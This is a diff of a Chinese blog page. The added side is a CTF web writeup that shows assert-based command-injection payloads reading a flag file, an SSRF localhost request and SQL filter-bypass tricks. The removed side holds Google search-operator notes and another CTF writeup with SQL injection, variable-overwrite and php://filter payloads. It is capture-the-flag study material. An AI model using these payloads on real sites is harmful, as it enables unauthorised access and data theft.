@@ -8,16 +8,31 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>风筝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="风筝">
-<meta property="og:type" content="website">
+  <meta name="description" content="CTF夺旗赛 WEB部分writeup将近中秋节，看到i春秋一场比赛，便做了几道web题0x01 easyphp 200首先看到about的信息，可以猜想存在源码泄露 扫描一下发现index.php.bak，内容如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950">
+<meta property="og:type" content="article">
 <meta property="og:title" content="风筝">
-<meta property="og:url" content="http://yoursite.com/page/3/index.html">
+<meta property="og:url" content="http://yoursite.com/2019/10/10/ctf夺旗赛/index.html">
 <meta property="og:site_name" content="风筝">
-<meta property="og:description" content="风筝">
+<meta property="og:description" content="CTF夺旗赛 WEB部分writeup将近中秋节，看到i春秋一场比赛，便做了几道web题0x01 easyphp 200首先看到about的信息，可以猜想存在源码泄露 扫描一下发现index.php.bak，内容如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/12/n08NE6.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/12/n0N29K.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/12/n0wuUs.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/12/nBKCGj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/12/nBKAs0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/12/nBKIO0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/12/nDw6ZF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/13/nsP0uF.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/13/nsPWjO.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/13/nsPjKS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/13/nra4PA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/13/nrdczq.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/09/13/nrqPO0.png">
+<meta property="og:updated_time" content="2019-10-10T13:54:25.267Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="风筝">
-<meta name="twitter:description" content="风筝">
+<meta name="twitter:description" content="CTF夺旗赛 WEB部分writeup将近中秋节，看到i春秋一场比赛，便做了几道web题0x01 easyphp 200首先看到about的信息，可以猜想存在源码泄露 扫描一下发现index.php.bak，内容如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/09/12/n08NE6.png">
   
     <link rel="alternative" href="/atom.xml" title="风筝" type="application/atom+xml">
   
@@ -153,43 +168,61 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-google hack" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-ctf夺旗赛" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/21/google hack/">Google Hack 语法</a>
-    </h1>
-  
-
-        
-        <a href="/2019/03/21/google hack/" class="archive-article-date">
-  	<time datetime="2019-03-21T11:58:59.313Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-21</time>
-</a>
-        
-      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Google-Hack-语法"><a href="#Google-Hack-语法" class="headerlink" title="Google Hack 语法"></a>Google Hack 语法</h2><h5 id="最近才知道搜索是有语法规则的，这里记录下方便回顾"><a href="#最近才知道搜索是有语法规则的，这里记录下方便回顾" class="headerlink" title="最近才知道搜索是有语法规则的，这里记录下方便回顾"></a>最近才知道搜索是有语法规则的，这里记录下方便回顾</h5><h3 id="inurl"><a href="#inurl" class="headerlink" title="inurl:"></a>inurl:</h3><p>搜索我们指定的字符是否存在于URL中</p>
-<p>例如输入:inurl:php?id=,将返回N个类似于这样的连接:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/xxx.php?id=xxx</span><br></pre></td></tr></table></figure></p>
-<h4 id="intext"><a href="#intext" class="headerlink" title="intext:"></a>intext:</h4><p>把网页中的正文内容中的某个字符做为搜索条件</p>
-<p>例如在google里输入 intext:公司.将返回所有在网页正文部分包含”公司”的网页.allintext:使用方法和intext类似.</p>
-<h4 id="intitle"><a href="#intitle" class="headerlink" title="intitle:"></a>intitle:</h4><p>搜索网页标题中包含有特定字符的网页。</p>
-<p>例如输入“intitle: cba”，这样网页标题中带有cba的网页都会被搜索出来。</p>
-<h4 id="Filetype"><a href="#Filetype" class="headerlink" title="Filetype:"></a>Filetype:</h4><p>搜索指定类型的文件。</p>
-<p>例如输入“filetype:cba”，将返回所有以cba结尾的文件URL</p>
-<h4 id="cache"><a href="#cache" class="headerlink" title="cache:"></a>cache:</h4><p>搜索google里关于某些内容的缓存</p>
-<h4 id="Site"><a href="#Site" class="headerlink" title="Site:"></a>Site:</h4><p>找到与指定网站有联系的URL</p>
-<p>例如输入“Site：family.chinaok.com”。所有和这个网站有联系的URL都会被显示。</p>
-<h4 id="info"><a href="#info" class="headerlink" title="info:"></a>info:</h4><p>查找指定站点的一些基本信息</p>
+        <h1 id="CTF夺旗赛-WEB部分writeup"><a href="#CTF夺旗赛-WEB部分writeup" class="headerlink" title="CTF夺旗赛 WEB部分writeup"></a>CTF夺旗赛 WEB部分writeup</h1><h2 id="将近中秋节，看到i春秋一场比赛，便做了几道web题"><a href="#将近中秋节，看到i春秋一场比赛，便做了几道web题" class="headerlink" title="将近中秋节，看到i春秋一场比赛，便做了几道web题"></a>将近中秋节，看到i春秋一场比赛，便做了几道web题</h2><h2 id="0x01-easyphp-200"><a href="#0x01-easyphp-200" class="headerlink" title="0x01 easyphp 200"></a>0x01 easyphp 200</h2><p><img src="https://s2.ax1x.com/2019/09/12/n08NE6.png" alt="image"><br>首先看到about的信息，可以猜想存在源码泄露</p>
+<p>扫描一下发现index.php.bak，内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;waf.php&quot;;</span><br><span class="line">if (isset($_GET[&apos;file&apos;])) &#123;</span><br><span class="line">	$file = $_GET[&apos;file&apos;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$file = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$file=str_replace(&quot;./&quot;,&quot;&quot;,$file);</span><br><span class="line">$file=str_replace(&quot;.\\&quot;,&quot;&quot;,$file);</span><br><span class="line">$para = &quot;templates/&quot; . $file . &quot;.php&quot;;</span><br><span class="line">assert(&quot;file_exists(&apos;$para&apos;)&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">		&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line"></span><br><span class="line">		&lt;title&gt;My PHP Website&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">		&lt;link rel=&quot;stylesheet&quot; href=&quot;http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css&quot; /&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;nav class=&quot;navbar navbar-inverse navbar-fixed-top&quot;&gt;</span><br><span class="line">			&lt;div class=&quot;container&quot;&gt;</span><br><span class="line">		    	&lt;div class=&quot;navbar-header&quot;&gt;</span><br><span class="line">		    		&lt;button type=&quot;button&quot; class=&quot;navbar-toggle collapsed&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbar&quot; aria-expanded=&quot;false&quot; aria-controls=&quot;navbar&quot;&gt;</span><br><span class="line">		            	&lt;span class=&quot;sr-only&quot;&gt;Toggle navigation&lt;/span&gt;</span><br><span class="line">		            	&lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class="line">		            	&lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class="line">		            	&lt;span class=&quot;icon-bar&quot;&gt;&lt;/span&gt;</span><br><span class="line">		          	&lt;/button&gt;</span><br><span class="line">		          	&lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Project name&lt;/a&gt;</span><br><span class="line">		        &lt;/div&gt;</span><br><span class="line">		        &lt;div id=&quot;navbar&quot; class=&quot;collapse navbar-collapse&quot;&gt;</span><br><span class="line">		          	&lt;ul class=&quot;nav navbar-nav&quot;&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($file == &quot;home&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?file=home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($file == &quot;about&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?file=about&quot;&gt;About&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($file == &quot;tips&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?file=tips&quot;&gt;Tips&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">						&lt;li &lt;?php if ($file == &quot;flag&quot;) &#123; ?&gt;class=&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href=&quot;?file=flag&quot;&gt;Flag&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">		          	&lt;/ul&gt;</span><br><span class="line">		        &lt;/div&gt;</span><br><span class="line">		    &lt;/div&gt;</span><br><span class="line">		&lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">		&lt;div class=&quot;container&quot; style=&quot;margin-top: 50px&quot;&gt;</span><br><span class="line">			&lt;?php</span><br><span class="line">				require_once $para;</span><br><span class="line">			?&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">		&lt;script src=&quot;http://code.jquery.com/jquery-latest.js&quot; /&gt;</span><br><span class="line">		&lt;script src=&quot;http://libs.baidu.com/bootstrap/3.0.3/js/bootstrap.min.js&quot; /&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>刚开始看到str_replace，便尝试php伪协议读取，构造php://filter/read=convert.base64-encode/recource=ind./ex,但什么也读不到，其它文件也一样，感觉可能是waf.php针对了php伪协议，便换了思路</p>
+<p>源码中，还有assert(“file_exists(‘$para’)”);，可以想到命令执行<br><img src="https://s2.ax1x.com/2019/09/12/n0N29K.png" alt="image"></p>
+<p>题目中受waf.php的影响，过滤了不少的命令，但可以用./或者.\绕过</p>
+<p>payload: ?file=11’)%20or%20system(‘ca./t%20w./af.php’);%23</p>
+<p><img src="https://s2.ax1x.com/2019/09/12/n0wuUs.png" alt="image"></p>
+<p>/?file=11’)%20or%20system(‘ca./t%20/flag’);%23 得到flag</p>
+<h2 id="0x02-redis-100"><a href="#0x02-redis-100" class="headerlink" title="0x02 redis 100"></a>0x02 redis 100</h2><p>是个redis未授权访问漏洞</p>
+<p><a href="https://www.cnblogs.com/co10rway/p/7995727.html" target="_blank" rel="noopener">https://www.cnblogs.com/co10rway/p/7995727.html</a></p>
+<p><img src="https://s2.ax1x.com/2019/09/12/nBKCGj.png" alt="image"></p>
+<p><img src="https://s2.ax1x.com/2019/09/12/nBKAs0.png" alt="image"></p>
+<h2 id="0x03-SQL-300"><a href="#0x03-SQL-300" class="headerlink" title="0x03 SQL 300"></a>0x03 SQL 300</h2><p><img src="https://s2.ax1x.com/2019/09/12/nBKIO0.png" alt="image"></p>
+<p>可见是个带完整sql语句的回显注入，不过过滤了贼多，是个黑名单检测，经过一番fuzz可知<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空格用%09代替</span><br><span class="line">or用 ||代替</span><br><span class="line">单引号用反斜杠\转义</span><br><span class="line">#用%00截断</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://s2.ax1x.com/2019/09/12/nDw6ZF.png" alt="image"></p>
+<p>可见要admin登录才行，于是换个思路爆admin的密码，首先报错注入感觉是不行的，因为select被黑名单检测了,本地测试一下:<br><img src="https://s2.ax1x.com/2019/09/13/nsP0uF.png" alt="image"></p>
+<p>思路有了，写个盲注脚本可爆破到admin的密码，登录进去后</p>
+<p><img src="https://s2.ax1x.com/2019/09/13/nsPWjO.png" alt="image"></p>
+<p>经过一番fuzz，发现把sql函数基本上过滤了，命令执行都没回显，感觉是个dnslog注入，但没反应，扫描了一番发现flag.php</p>
+<p><img src="https://s2.ax1x.com/2019/09/13/nsPjKS.png" alt="image"></p>
+<p>感觉仍然没头绪。</p>
+<h2 id="0x04-ssrf-200"><a href="#0x04-ssrf-200" class="headerlink" title="0x04 ssrf 200"></a>0x04 ssrf 200</h2><p><img src="https://s2.ax1x.com/2019/09/13/nra4PA.png" alt="image"></p>
+<p>可以看到请求get参数是url，尝试请求ssrf内网</p>
+<p>payload: ?url=<a href="http://localhost/" target="_blank" rel="noopener">http://localhost/</a></p>
+<p><img src="https://s2.ax1x.com/2019/09/13/nrdczq.png" alt="image"></p>
+<p>然后跟着提示一步一步去读取./git源码<br><img src="https://s2.ax1x.com/2019/09/13/nrqPO0.png" alt="image"></p>
 
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -198,16 +231,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/03/21/google hack/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/10/10/ctf夺旗赛/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2019/10/09/zzcms8.2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ZZCMS8.2 代码审计</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -227,102 +319,14 @@
 
 
 
-
-  
-    <article id="post-lun web" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/20/lun web/">CTF - 论剑场</a>
-    </h1>
-  
-
-        
-        <a href="/2019/03/20/lun web/" class="archive-article-date">
-  	<time datetime="2019-03-20T08:43:57.214Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-20</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="CTF-论剑场"><a href="#CTF-论剑场" class="headerlink" title="CTF - 论剑场"></a>CTF - 论剑场</h2><h3 id="闲来无事，做会题目-持续更新"><a href="#闲来无事，做会题目-持续更新" class="headerlink" title="闲来无事，做会题目(持续更新)"></a>闲来无事，做会题目(持续更新)</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&apos;flag.php&apos;);</span><br><span class="line">$b = &apos;ssAEDsssss&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">    $c =trim(file_get_contents($b));</span><br><span class="line">    if($a==$c)&#123;</span><br><span class="line">        echo $myflag;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &apos;继续努力，相信flag离你不远了&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
-<p>考察变量覆盖漏洞extract() : 从数组中将变量导入到当前的符号表</p>
-<p>payload: a=&amp;b=</p>
-<h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p><img src="https://s2.ax1x.com/2019/04/04/AgIgFU.jpg" alt="image"></p>
-<p>是个计算题，要求在三秒钟内算出来，明显写脚本跑</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &apos;http://123.206.31.85:10002/&apos;</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">res = r.get(url)</span><br><span class="line"># print response.text</span><br><span class="line">text = res.text</span><br><span class="line">cal = re.findall(&quot;(.*?)&lt;/p&gt;&quot;,text) #非贪婪算法</span><br><span class="line"># print str(cal)[3:-2]</span><br><span class="line">ans = eval(str(cal)[3:-2])</span><br><span class="line"># print ans</span><br><span class="line">data = &#123;&apos;result&apos;:ans&#125;</span><br><span class="line">res0 = r.post(url,data=data)</span><br><span class="line">print res0.text</span><br></pre></td></tr></table></figure>
-<h4 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h4><ul>
-<li>考点 : php伪协议<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h4><p>考察万能密码<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; or 1 #</span><br></pre></td></tr></table></figure></p>
-<p>写了一下后台代码原理大致如下，亲测有效:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  error_reporting(0);</span><br><span class="line">  $servername = &apos;127.0.0.1&apos;;</span><br><span class="line">  $username = &apos;root&apos;;</span><br><span class="line">  $password = &apos;root&apos;;</span><br><span class="line">  $dbname = &apos;code&apos;;</span><br><span class="line"></span><br><span class="line">  @$con = mysql_connect($servername,$username,$password);</span><br><span class="line"></span><br><span class="line">  if(!$con)&#123;</span><br><span class="line">    die(&apos;Failed to connect to Mysql&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">  mysql_select_db($dbname) or die(&apos;failed to connect to dbname:$dbname&apos;);</span><br><span class="line">  $username = $_POST[&apos;username&apos;];</span><br><span class="line">  $password = $_POST[&apos;password&apos;];</span><br><span class="line">  $sql = &quot;select * from user where username= &apos;$username&apos; and password = &apos;$password&apos;&quot;;</span><br><span class="line">  echo $sql;</span><br><span class="line">  $res = mysql_query($sql);</span><br><span class="line">  $row = mysql_fetch_array($res);</span><br><span class="line">  if($row)&#123;</span><br><span class="line">   	echo &quot;success&quot;;</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">   	echo &quot;failed&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><p>sqlmap -u “地址” -v 3 –dbs</p>
-<p>-v 3 可以看到payload</p>
-<p>–tables –columns </p>
-<h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put me a message bugku then you can get the flag</span><br></pre></td></tr></table></figure>
-<p>curl -X PUT “地址” -d “bugku”</p>
-<h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>robots.txt下发现shell.php<br><img src="https://s2.ax1x.com/2019/04/03/Ac29MT.jpg" alt="image"><br>md5截断验证<br>这里采用短时间生成大量MD5，牺牲空间来换取时间<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import hashlib</span><br><span class="line">sum = []</span><br><span class="line">j = 0</span><br><span class="line">f = open(&quot;gen_md5.txt&quot;, &quot;a&quot;)</span><br><span class="line">for i in xrange(10000000):</span><br><span class="line">    tmp = (hashlib.md5(str(i)).hexdigest(),i)</span><br><span class="line">    sum.append(tmp)</span><br><span class="line">    # print sum</span><br><span class="line">    j = j+1</span><br><span class="line">    if(j==10000000):</span><br><span class="line">        # print sum</span><br><span class="line">        for i in sum:</span><br><span class="line">            f.write(&quot;&#123;0&#125;&#123;1&#125;&quot;.format(i,&quot;\n&quot;))</span><br><span class="line">        j=0</span><br><span class="line">        sum = []</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure></p>
-<p>然后再执行匹配命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat gen_md5.txt|grep \(\&apos;str  //str是题目</span><br></pre></td></tr></table></figure></p>
-<h3 id="web17-流量分析"><a href="#web17-流量分析" class="headerlink" title="web17 流量分析"></a>web17 流量分析</h3><p>用wireshark追踪TCP流即可看见flag</p>
-<h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>是个sql绕过注入</p>
-<p><img src="https://s2.ax1x.com/2019/04/04/Ag4WAU.jpg" alt="image"></p>
-<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; unorion seorlect 1,group_concat(schema_name),3 from infoorrmation_schema.schemata --+</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; unorion seorlect 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; unorion seorlect 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_schema=database() aandnd table_name = &apos;flag&apos; --+</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; unorion seorlect 1,flag,3 from flag --+</span><br></pre></td></tr></table></figure>
-<h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><p>题目：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你的动态密文是：4803baa775dc5841bf99fae420c1a7688</span><br><span class="line">GET提交对应的密文可以得到flag(form_input_name=&apos;key&apos;)</span><br><span class="line">输出格式：&apos;flag&#123;....&#125;&apos;</span><br></pre></td></tr></table></figure></p>
-<p>写个脚本多运行几次<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &quot;http://123.206.31.85:10020/&quot;</span><br><span class="line">r = requests.session()</span><br><span class="line">text = r.get(url).content</span><br><span class="line"></span><br><span class="line">key = re.findall(r&quot;[0-9a-z]+&quot;,text)[0]</span><br><span class="line">url1 = url + &quot;?key=&quot; + key</span><br><span class="line">res = r.get(url1).content</span><br><span class="line">print res</span><br></pre></td></tr></table></figure></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/03/20/lun web/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
